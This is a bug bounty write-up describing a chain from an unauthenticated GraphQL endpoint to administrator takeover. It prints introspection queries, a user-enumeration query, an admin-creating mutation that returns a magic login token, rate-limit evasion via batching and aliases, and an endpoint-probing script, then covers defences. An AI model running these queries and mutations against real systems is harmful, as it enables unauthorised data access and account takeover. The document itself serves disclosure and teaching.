---
title: "GraphQL Introspection to Admin Takeover: Exploiting Unauthenticated APIs"
description: "How a single misconfigured endpoint exposed users and allowed the creation of administrator accounts through GraphQL introspection."
date: 2026-02-01
tags: ["graphql", "api-security", "exploitation", "bugbounty"]
---

## Introduction

GraphQL has become a popular alternative to REST APIs, offering clients the flexibility to request exactly the data they need. But that flexibility comes at a cost -- when misconfigured, GraphQL can hand attackers a complete blueprint of your API and every operation it supports. In this post, I walk through a real-world exploitation chain where an unauthenticated GraphQL endpoint on a management dashboard led to full administrator account takeover.

## Understanding GraphQL Security

### How GraphQL Differs from REST

In a traditional REST API, each endpoint serves a fixed set of data. Attackers need to enumerate endpoints one by one, often guessing paths like `/api/users` or `/api/admin`. GraphQL consolidates everything behind a single endpoint -- typically `/graphql` -- and uses a strongly typed schema to describe every query, mutation, and subscription available.

This means:

- **Single endpoint**: All operations go through one URL, so there is no need to brute-force paths.
- **Self-documenting**: If introspection is enabled, the schema tells you exactly what the API can do.
- **Flexible queries**: Clients can request deeply nested relationships in a single request.
- **Mutations for writes**: Creating, updating, and deleting data all happen through mutations exposed in the schema.

### Common GraphQL Vulnerabilities

- **Introspection enabled in production** -- exposes the full schema to anyone who asks.
- **Missing authentication** -- endpoints accessible without credentials.
- **Missing authorization** -- authenticated users can access data or operations beyond their role.
- **Excessive data exposure** -- queries returning sensitive fields like emails, tokens, or internal IDs.
- **No query depth or complexity limits** -- allows denial-of-service via deeply nested queries.
- **Batched query abuse** -- multiple operations in a single request bypassing rate limits.

## The Vulnerability

During a bug bounty engagement, I discovered that a management dashboard exposed a GraphQL endpoint at:

```http
POST /graphql HTTP/1.1
Host: dashboard.target.com
Content-Type: application/json
```

The endpoint required **no authentication whatsoever**. No API key, no session token, no JWT -- nothing. Any HTTP client could send queries and mutations to this endpoint and receive full responses.

## Step 1: Schema Introspection

The first thing to try against any GraphQL endpoint is an introspection query. This asks the API to describe its own schema:

```graphql
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
  }
}
```

Sending this with `curl`:

```bash
curl -s -X POST https://dashboard.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } } }"}' \
  | jq .
```

The response came back with the full schema. Among the types returned, several stood out immediately:

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "OperatorUser",
          "kind": "OBJECT",
          "fields": [
            { "name": "id", "type": { "name": "ID", "kind": "SCALAR" } },
            { "name": "email", "type": { "name": "String", "kind": "SCALAR" } },
            { "name": "firstName", "type": { "name": "String", "kind": "SCALAR" } },
            { "name": "lastName", "type": { "name": "String", "kind": "SCALAR" } },
            { "name": "title", "type": { "name": "String", "kind": "SCALAR" } },
            { "name": "role", "type": { "name": "UserRole", "kind": "ENUM" } },
            { "name": "mfaEnabled", "type": { "name": "Boolean", "kind": "SCALAR" } },
            { "name": "lastLogin", "type": { "name": "DateTime", "kind": "SCALAR" } },
            { "name": "magicLoginToken", "type": { "name": "String", "kind": "SCALAR" } }
          ]
        },
        {
          "name": "UserRole",
          "kind": "ENUM",
          "fields": null
        }
      ]
    }
  }
}
```

The `OperatorUser` type contained sensitive fields including `email`, `role`, `mfaEnabled`, and critically, `magicLoginToken`. I also queried for available queries and mutations:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
  }
}
```

This revealed queries like `searchOperatorUserTable` and mutations like `createOperatorUser` -- everything needed for the next steps.

## Step 2: Enumerating Users

With the schema mapped, I crafted a query to pull user data using the `searchOperatorUserTable` query:

```graphql
query {
  searchOperatorUserTable(
    input: {
      query: ""
      limit: 1000
      offset: 0
    }
  ) {
    totalCount
    results {
      id
      email
      firstName
      lastName
      title
      role
      mfaEnabled
      lastLogin
    }
  }
}
```

The response was staggering:

```json
{
  "data": {
    "searchOperatorUserTable": {
      "totalCount": 847,
      "results": [
        {
          "id": "usr_a1b2c3d4",
          "email": "admin@target.com",
          "firstName": "Sarah",
          "lastName": "Chen",
          "title": "Platform Administrator",
          "role": "ADMIN",
          "mfaEnabled": true,
          "lastLogin": "2026-01-28T14:32:00Z"
        },
        {
          "id": "usr_e5f6g7h8",
          "email": "john.doe@target.com",
          "firstName": "John",
          "lastName": "Doe",
          "title": "Operations Manager",
          "role": "MANAGER",
          "mfaEnabled": false,
          "lastLogin": "2026-01-27T09:15:00Z"
        }
      ]
    }
  }
}
```

**847 users** were returned, complete with email addresses, job titles, roles, MFA status, and login timestamps. This data alone represents a significant information disclosure -- it could be used for targeted phishing, credential stuffing, or identifying high-value accounts.

Notable observations from the user data:

- 23 users had the `ADMIN` role
- 312 users had MFA disabled
- Several accounts had not logged in for over a year (potentially abandoned)

## Step 3: Creating an Admin Account

The introspection results had also revealed a `createOperatorUser` mutation. I inspected its arguments:

```graphql
{
  __type(name: "CreateOperatorUserInput") {
    inputFields {
      name
      type {
        name
        kind
        ofType {
          name
        }
      }
    }
  }
}
```

Which returned:

```json
{
  "data": {
    "__type": {
      "inputFields": [
        { "name": "email", "type": { "name": null, "kind": "NON_NULL", "ofType": { "name": "String" } } },
        { "name": "firstName", "type": { "name": null, "kind": "NON_NULL", "ofType": { "name": "String" } } },
        { "name": "lastName", "type": { "name": null, "kind": "NON_NULL", "ofType": { "name": "String" } } },
        { "name": "title", "type": { "name": "String", "kind": "SCALAR" } },
        { "name": "role", "type": { "name": null, "kind": "NON_NULL", "ofType": { "name": "UserRole" } } }
      ]
    }
  }
}
```

With this, I crafted the mutation to create a new administrator account:

```graphql
mutation {
  createOperatorUser(
    input: {
      email: "researcher@protonmail.com"
      firstName: "Security"
      lastName: "Researcher"
      title: "Bug Bounty Test"
      role: ADMIN
    }
  ) {
    id
    email
    role
    magicLoginToken
  }
}
```

The API returned:

```json
{
  "data": {
    "createOperatorUser": {
      "id": "usr_z9y8x7w6",
      "email": "researcher@protonmail.com",
      "role": "ADMIN",
      "magicLoginToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    }
  }
}
```

The mutation succeeded. It created a brand-new user with the `ADMIN` role and returned a magic login token -- a JWT that grants immediate access without a password or MFA challenge.

## Step 4: Dashboard Takeover

Using the magic login token, I accessed the dashboard by navigating to the login endpoint:

```http
GET /auth/magic?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... HTTP/1.1
Host: dashboard.target.com
```

This redirected to the admin dashboard with full privileges. From this position, an attacker would have had the ability to:

- View and modify all user accounts
- Access sensitive business data and analytics
- Change system configurations
- Export customer data
- Invite additional accounts
- Modify or delete existing records

At this point I stopped testing, documented the findings, and submitted the report through the bug bounty program.

## Technical Analysis

### Why This Happened

This vulnerability was the result of multiple security failures compounding on each other:

1. **No authentication check on the GraphQL endpoint.** The `/graphql` route was not protected by any authentication middleware. Any unauthenticated HTTP request was processed.

2. **Introspection enabled in production.** The GraphQL server had introspection enabled, allowing anyone to query the full schema. This gave attackers a complete map of every type, query, and mutation.

3. **No authorization on queries or mutations.** Even if the endpoint had required authentication, there were no role-based access controls on individual operations. Any authenticated user could have executed admin-level mutations.

4. **Magic login tokens returned in API responses.** The `magicLoginToken` field was queryable and returned in mutation responses. This token bypassed password and MFA requirements entirely.

5. **No rate limiting or monitoring.** There were no controls to detect or throttle bulk data enumeration or rapid account creation.

### The Root Cause

The likely root cause was that this endpoint was originally built for internal tooling and was never intended to be publicly accessible. At some point it was exposed -- either through a misconfigured reverse proxy, a deployment error, or an infrastructure change -- without the corresponding security controls being added.

## Exploitation Techniques

The following techniques are useful when testing GraphQL endpoints.

### Field Discovery

Use introspection to enumerate all fields on a type:

```graphql
{
  __type(name: "OperatorUser") {
    fields {
      name
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```

### Type Exploration

Discover all types in the schema and identify interesting objects:

```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

Filter for object types (ignoring built-in scalars and introspection types):

```python
import requests
import json

url = "https://target.com/graphql"
query = '{ __schema { types { name kind } } }'

response = requests.post(url, json={"query": query})
types = response.json()["data"]["__schema"]["types"]

interesting = [
    t for t in types
    if t["kind"] == "OBJECT" and not t["name"].startswith("__")
]

for t in interesting:
    print(f"  {t['name']}")
```

### Batched Queries

GraphQL often supports multiple operations in a single request, which can be used to bypass rate limiting:

```json
[
  {
    "query": "{ searchOperatorUserTable(input: { query: \"\", limit: 100, offset: 0 }) { results { id email } } }"
  },
  {
    "query": "{ searchOperatorUserTable(input: { query: \"\", limit: 100, offset: 100 }) { results { id email } } }"
  },
  {
    "query": "{ searchOperatorUserTable(input: { query: \"\", limit: 100, offset: 200 }) { results { id email } } }"
  }
]
```

### Alias-Based Enumeration

Use aliases to send multiple variations of a query in a single request:

```graphql
{
  a: searchOperatorUserTable(input: { query: "admin", limit: 100, offset: 0 }) {
    totalCount
    results { id email role }
  }
  b: searchOperatorUserTable(input: { query: "manager", limit: 100, offset: 0 }) {
    totalCount
    results { id email role }
  }
  c: searchOperatorUserTable(input: { query: "engineer", limit: 100, offset: 0 }) {
    totalCount
    results { id email role }
  }
}
```

This sends three separate search operations in one HTTP request, making it harder for simple rate limiters to detect.

## Detection Methods

### Identifying GraphQL Endpoints

Common paths to check:

```bash
/graphql
/graphiql
/v1/graphql
/api/graphql
/query
/gql
/playground
```

A quick enumeration script:

```bash
#!/bin/bash
TARGET="https://dashboard.target.com"
PATHS=("/graphql" "/graphiql" "/v1/graphql" "/api/graphql" "/query" "/gql")

for path in "${PATHS[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$TARGET$path" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}')
  echo "$path -> HTTP $status"
done
```

### Testing for Introspection

Send the standard introspection query and check for a valid response:

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } } }"}' \
  | jq '.data.__schema.queryType.name'
```

If this returns a type name (e.g., `"Query"`), introspection is enabled.

### Testing for Authentication Bypass

Send a query without any authentication headers:

```bash
# No auth headers -- should return 401 or 403
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' \
  -w "\nHTTP Status: %{http_code}\n"
```

If the response contains `{"data":{"__typename":"Query"}}` with a 200 status, the endpoint is unauthenticated.

### Recommended Tools

| Tool | Purpose |
|------|---------|
| **GraphQL Voyager** | Visual schema exploration -- renders the schema as an interactive graph |
| **InQL** | Burp Suite extension for GraphQL testing and introspection analysis |
| **graphql-cop** | Security auditing tool that checks for common GraphQL misconfigurations |
| **Altair GraphQL Client** | Feature-rich GraphQL IDE for crafting and testing queries |
| **BatchQL** | Tool for detecting and exploiting batched query vulnerabilities |

## Secure Implementation

If you are building or maintaining a GraphQL API, the following controls should be in place.

### Authentication Middleware

Enforce authentication before the GraphQL resolver executes:

```python
from functools import wraps
from flask import request, jsonify

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization")
        if not token:
            return jsonify({"error": "Authentication required"}), 401

        user = validate_token(token)
        if not user:
            return jsonify({"error": "Invalid token"}), 403

        request.current_user = user
        return f(*args, **kwargs)
    return decorated

@app.route("/graphql", methods=["POST"])
@require_auth
def graphql_endpoint():
    # Only authenticated requests reach here
    return execute_graphql(request)
```

### Field-Level Authorization

Check permissions at the resolver level, not just at the endpoint:

```python
def resolve_operator_users(obj, info, input):
    user = info.context.current_user

    if user.role not in ["ADMIN", "MANAGER"]:
        raise PermissionError("Insufficient privileges")

    # Strip sensitive fields for non-admin users
    results = query_users(input)
    if user.role != "ADMIN":
        for r in results:
            r.pop("magicLoginToken", None)
            r.pop("mfaEnabled", None)

    return results
```

### Disable Introspection in Production

For Apollo Server:

```javascript
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== "production",
});
```

For graphql-yoga:

```javascript
import { useDisableIntrospection } from "@graphql-yoga/plugin-disable-introspection";

const yoga = createYoga({
  plugins: [
    process.env.NODE_ENV === "production"
      ? useDisableIntrospection()
      : {},
  ],
});
```

### Query Complexity Limits

Prevent expensive or deeply nested queries:

```javascript
import depthLimit from "graphql-depth-limit";
import { createComplexityLimitRule } from "graphql-validation-complexity";

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    depthLimit(5),
    createComplexityLimitRule(1000),
  ],
});
```

### Rate Limiting

Apply rate limiting at the API gateway or application level:

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route("/graphql", methods=["POST"])
@limiter.limit("60/minute")
@require_auth
def graphql_endpoint():
    return execute_graphql(request)
```

## Impact Assessment

| Category | Severity |
|----------|----------|
| **Confidentiality** | Critical -- 847 user records exposed including emails, roles, and MFA status |
| **Integrity** | Critical -- arbitrary admin accounts could be created |
| **Availability** | High -- admin access could be used to disrupt the platform |
| **CVSS Score** | 9.8 (Critical) |
| **Attack Complexity** | Low -- no authentication required, no special tools needed |

## Key Takeaways

1. **Never expose introspection in production.** It hands attackers the full API blueprint. If developers need schema access, provide it through internal tooling or a schema registry.

2. **Authentication must be enforced at the transport layer.** Every request to a GraphQL endpoint should be authenticated before it reaches the resolver.

3. **Authorization must be enforced at the field level.** Authenticating a user is not enough. Each query and mutation must verify that the requesting user has the appropriate role and permissions.

4. **Sensitive tokens should never be returned in API responses.** Magic login links, password reset tokens, and session tokens should be delivered through secure side channels (email, SMS), not embedded in query responses.

5. **Assume internal tools will be exposed.** Build every service as if it will be publicly accessible. Defense in depth means that a single misconfiguration should not lead to full compromise.

6. **Monitor and rate-limit GraphQL endpoints.** Log all queries, flag unusual patterns (bulk enumeration, introspection attempts), and enforce rate limits to slow down attackers.

GraphQL is a powerful tool, but its flexibility demands rigorous security controls. A single unprotected endpoint can unravel an entire platform.
